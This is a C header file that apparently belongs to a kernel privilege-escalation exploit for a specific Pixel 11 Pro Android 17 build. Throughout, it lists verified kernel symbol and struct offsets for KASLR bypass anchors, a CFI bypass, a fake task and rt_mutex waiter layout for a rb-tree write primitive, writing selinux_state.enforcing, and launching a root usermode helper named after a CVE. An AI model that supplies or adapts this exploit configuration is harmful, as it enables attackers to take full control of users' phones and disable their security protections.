// grizzly — Pixel 11 Pro, Android 17 (kernel KMI: android16-6.12)
// Build: CD1A.260618.001.C2  (Kernel CI build ab15730085)
// Kernel: 6.12.69-android16-6-gcdc3e5d4075f-ab15730085-4k
//
// Exact ab15730085 Image/BTF offsets.  The 6.12 chain uses only GhostLock
// rb-tree data writes; boot_id is limited to the KASLR-stage fingerprint and
// the owner window is read through printk's proc_dointvec ctl_table entry. It
// never installs a callback or executes sprayed/direct-map bytes.
//
// VERIFIED sources:
//   - Symbol offsets: kallsyms via kallsyms-finder on boot.img kernel Image.
//   - Config: IKCONFIG embedded in the Image (VA_BITS=39, 4K pages,
//     RANDSTRUCT_NONE, MEMCG=y, ZONE_DMA=n, SLUB=y).
//   - Struct offsets: embedded BTF (CONFIG_DEBUG_INFO_BTF=y), verified against
//     android16-6.12 kernel source at commit gcdc3e5d4075f.
//   - task_struct fields: empirically verified on init_task in the Image.

#ifndef OFFSET_H
#define OFFSET_H

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "grizzly-CD1A.260618.001.C2-app"
#else
#define BUILD_VARIANT_LABEL "grizzly-CD1A.260618.001.C2-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "google/grizzly/grizzly:17/CD1A.260618.001.C2/15730085:user/release-keys"
#endif

// ── Base / memory layout ────────────────────────────────────────────────
// KIMAGE_TEXT_BASE = 0xffffffc080000000 (2GB module region, VA_BITS=39).
// Verified: _text kallsyms = 0xffffffc080000000.
#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

// ── Kernel symbol offsets (kallsyms, VERIFIED) ──────────────────────────
#define CONFIGFS_READ_ITER_OFF         0x0007c4868ULL
#define CONFIGFS_WRITE_ITER_OFF        0x0007c4a0cULL
#define CONFIGFS_BIN_READ_ITER_OFF     0x0007c4be0ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF    0x0007c4e14ULL
#define COPY_FROM_ITER_OFF             0x00017ca64ULL  /* _copy_from_iter */
#define COPY_TO_ITER_OFF               0x00016e398ULL  /* _copy_to_iter */
#define COPY_SPLICE_READ_OFF           0x0003e8b00ULL
#define NOOP_LLSEEK_OFF                0x00075548cULL
#define INIT_TASK_OFF                  0x0025ed8c0ULL
#define INIT_CRED_OFF                  0x002603630ULL
#define ROOT_TASK_GROUP_OFF            0x002838800ULL
#define SELINUX_BLOB_SIZES_OFF         0x0019a5868ULL
#define KMALLOC_CACHES_OFF             0x00199b4c0ULL
#define ANON_PIPE_BUF_OPS_OFF          0x00132b808ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000522b08ULL
#define SYSTEM_UNBOUND_WQ_OFF          0x00199b250ULL

// Derived text macros (VA = KIMAGE_TEXT_BASE + offset)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_ITER_OFF)
#define CONFIGFS_BIN_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_FROM_ITER (KIMAGE_TEXT_BASE + COPY_FROM_ITER_OFF)
#define COPY_TO_ITER (KIMAGE_TEXT_BASE + COPY_TO_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define SELINUX_ENFORCING_OFF          0x002887890ULL
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)

// Ashmem is implemented in Rust on 6.12 and is not used by the direct-root
// route. These are compile-only placeholders for legacy helpers.
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE)
#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE)

// security_hook_heads: GONE in 6.12 (LSM refactored to per-hook active
// booleans). The SELinux bypass writes selinux_state.enforcing through the
// constrained GhostLock child-node primitive.
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE)

// ── Page layout (payload-internal constants) ────────────────────────────
#define LOCK_OFF        0x1350
#define W0_OFF          0x2220
#define FOPS_OFF        0x1000
#define SCRATCH_OFF     0x3000
#define RIGHT_OFF       0x4440
#define LEFT_OFF        0x5550
#define FAKE_TASK_OFF   0x3200

// ── 6.12 CFI bypass: shellcode and configfs_buffer on page ──────────
// Legacy page slots below are retained for compile compatibility only; the
// 6.12 route neither points a callback at them nor executes their bytes.
#define SHELLCODE_OFF               0x1500
#define CFG_FAKE_OFF                0x6000
#define CFG_TARGET_SLOT             (CFG_FAKE_OFF + 88)
#define CFG_ORIG_WRITE_SLOT         (CFG_FAKE_OFF + 0x200) // 0x6200
#define CFG_ORIG_READ_SLOT          (CFG_FAKE_OFF + 0x208) // 0x6208
#define CFG_COPY_FROM_SLOT          (CFG_FAKE_OFF + 0x210) // 0x6210
#define CFG_COPY_TO_SLOT            (CFG_FAKE_OFF + 0x218) // 0x6218
#define CFG_FAKE_SIZE               0x1000

// ── struct kiocb offsets (verified from fs.h source) ────────────────
#define KIOCB_FILP_OFF              0x00
#define KIOCB_FLAGS_OFF             0x20
#define IOCB_WRITE_FLAG             0x40000  // (1 << 18)

// ── struct file private_data offset ──────────────────────────────────
#define FILE_PRIVATE_DATA_OFF       0x20

// ── CFI bypass: configfs file_operations (writable .data) ────────────
// Exact addresses retained for diagnostics; the direct-root route does not
// modify these tables.
#define CONFIGFS_FILE_OPS             0xffffffc081336c00ULL
#define CONFIGFS_FILE_OPS_WRITE_ITER  (CONFIGFS_FILE_OPS + 0x30)
#define CONFIGFS_FILE_OPS_READ_ITER   (CONFIGFS_FILE_OPS + 0x28)
#define CONFIGFS_BIN_FILE_OPS         0xffffffc081336d08ULL
#define CONFIGFS_BIN_FILE_OPS_WRITE_ITER (CONFIGFS_BIN_FILE_OPS + 0x30)
#define CONFIGFS_BIN_FILE_OPS_READ_ITER  (CONFIGFS_BIN_FILE_OPS + 0x28)

// ── Slide references (KASLR bypass anchors, VERIFIED) ───────────────────
#define SLIDE_NFULNL_LOGGER_OFF        0x0025e1fb0ULL
#define SLIDE_LOGGERS_0_1_OFF          0x0025e1ef8ULL  /* loggers(0x25e1ef0)+8   */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF  0x00271ccb8ULL  /* random_table[4].data, ctl_table stride=0x38 */
#define SLIDE_SYSCTL_BOOTID_OFF        0x0028a9e98ULL
#define SLIDE_PRINTK_DATA_OFF          0x00267cf78ULL  /* printk_sysctls[0].data */
#define SLIDE_CONSOLE_PRINTK_OFF       0x00260cbb8ULL  /* int console_printk[4] */
#define SLIDE_INIT_TASK_OFF            INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF      ROOT_TASK_GROUP_OFF

#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_PRINTK_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_PRINTK_DATA_OFF)
#define SLIDE_CONSOLE_PRINTK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_CONSOLE_PRINTK_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)
#define SLIDE_CONSOLE_PRINTK_DEFAULT_0 7
#define SLIDE_CONSOLE_PRINTK_DEFAULT_1 4
#define SLIDE_CONSOLE_PRINTK_DEFAULT_2 1
#define SLIDE_CONSOLE_PRINTK_DEFAULT_3 7

// ── struct file_operations (BTF, size 0x108) — VERIFIED, SAME as 6.6 ────
#define FOPS_OWNER_OFF          0x00
#define FOPS_FLAGS_OFF          0x08
#define FOPS_LLSEEK_OFF         0x10
#define FOPS_READ_OFF           0x18
#define FOPS_WRITE_OFF          0x20
#define FOPS_READ_ITER_OFF      0x28
#define FOPS_WRITE_ITER_OFF     0x30
#define FOPS_IOCTL_OFF          0x50
#define FOPS_COMPAT_IOCTL_OFF   0x58
#define FOPS_MMAP_OFF           0x60
#define FOPS_OPEN_OFF           0x68
#define FOPS_FLUSH_OFF          0x70
#define FOPS_RELEASE_OFF        0x78
#define FOPS_FSYNC_OFF          0x80
#define FOPS_SPLICE_READ_OFF    0xb8
#define FOPS_SHOW_FDINFO_OFF    0xd8

// ── struct rt_mutex_waiter (source, size 0x70) — NESTED, SAME as 6.6 ────
#define FAKE_WAITER_TREE_PRIO_OFF       0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF   0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF    0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF            0x50
#define FAKE_WAITER_LOCK_OFF            0x58
#define FAKE_WAITER_WAKE_STATE_OFF      0x60
#define FAKE_WAITER_WW_CTX_OFF          0x68

// ── struct task_struct (empirically verified on init_task) ──────────────
// Exact offsets below come from the embedded BTF (size 0x1440).
#define FAKE_TASK_USAGE_OFF         0x40
#define FAKE_TASK_PRIO_OFF          0x94
#define FAKE_TASK_NORMAL_PRIO_OFF   0x9c
#define FAKE_TASK_TASK_GROUP_OFF    0x420
#define FAKE_TASK_PI_LOCK_OFF       0x9ec
#define FAKE_TASK_PI_WAITERS_OFF    0xa00
#define FAKE_TASK_PI_TOP_TASK_OFF   0xa10
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0xa18

#define TASK_PID_OFF                0x708
#define TASK_TGID_OFF               0x70c
#define TASK_REAL_PARENT_OFF        0x718
#define TASK_REAL_CRED_OFF          0x8f8
#define TASK_CRED_OFF               0x900
#define TASK_COMM_OFF               0x910
#define TASK_TASKS_OFF              0x638
#define TASK_SECCOMP_OFF            0x9c8
#define TASK_THREAD_INFO_FLAGS_OFF  0x00
#define TASK_ATOMIC_FLAGS_OFF       0x6c8

// ── struct cred (source-derived, CAP_FULL verified) ─────────────────────
// Exact offsets below come from the embedded BTF (size 0xb8).
#define CRED_UID_OFF                 0x08
#define CRED_SECUREBITS_OFF          0x28
#define CRED_CAPS_OFF                0x30
#define CRED_SECURITY_OFF            0x80
#define SELINUX_CRED_BLOB_OFF        0
#define SELINUX_CRED_OSID_OFF        0
#define SELINUX_CRED_SID_OFF         4

// ── struct seccomp (source, SAME as 6.6) ────────────────────────────────
#define SECCOMP_MODE_OFF              0x00
#define SECCOMP_FILTER_COUNT_OFF      0x04
#define SECCOMP_FILTER_OFF            0x08
#define TIF_SECCOMP_BIT               11
#define PFA_NO_NEW_PRIVS_BIT          0

// ── struct mm_struct (BTF, size 0x4c0) ──────────────────────────────
#define MM_IOCTX_TABLE_OFF            0x408
#define MM_OWNER_OFF                  0x410
// ⚠ MM_STRUCT_SZ must be the kmem_cache STRIDE, not BTF sizeof.
// fork.c: mm_size = sizeof(mm_struct)[0x4c0] + cpumask_size()[8,
// NR_CPUS=32→1 long] + mm_cid_size()[0, SCHED_MM_CID=n] = 1224,
// SLAB_HWCACHE_ALIGN rounds to L1_CACHE_BYTES=64 → 1280 = 0x500.
// (Same class of fix as tegu 6.1: 0x3c0 BTF → 0x400 real stride.)
#define MM_STRUCT_SZ                  0x500

// ── kmalloc cache enums (source) ────────────────────────────────────────
// CONFIG_ZONE_DMA=n, CONFIG_MEMCG=y, no RANDOM_KMALLOC:
//   KMALLOC_NORMAL=0, KMALLOC_RECLAIM=1, KMALLOC_CGROUP=2, NR=3
#define KMALLOC_CGROUP_TYPE           2
#define KMALLOC_CACHE_TYPES           3
#define PIPE_BUFFER_SIZE              0x28
#define KMALLOC_PIPE_INDEX            11

// ── struct page / struct slab (BTF) — SAME as 6.6 ───────────────────────
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x08
#define STRUCT_PAGE_TYPE_OFF          0x30

#define PIPE_BUFFER_SLOTS             32
#define PIPE_BUF_FLAG_CAN_MERGE       0x10

// ── workqueue / pool_workqueue / worker_pool (BTF) — SAME as 6.6 ────────
#define WQ_DFL_PWQ_OFF    0xc0
#define PWQ_POOL_OFF       0x00
#define PWQ_WQ_OFF         0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF     0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF  0x60
#define PWQ_MAX_ACTIVE_OFF 0x64
#define POOL_WORKLIST_OFF  0x28
#define POOL_NR_IDLE_OFF   0x3c

#define WORK_DATA_OFF  0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF  0x18

// ── configfs_buffer (BTF, size 0x80) — SAME as 6.6 ──────────────────────
#define CFG_PAGE_OFF             16
#define CFG_NEEDS_READ_FILL_OFF  80
#define CFG_BIN_BUFFER_OFF       88
#define CFG_BIN_BUFFER_SIZE_OFF  96
#define CFG_CB_MAX_SIZE_OFF      100

// ── su_daemon UMH ───────────────────────────────────────────────────────
#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

#endif
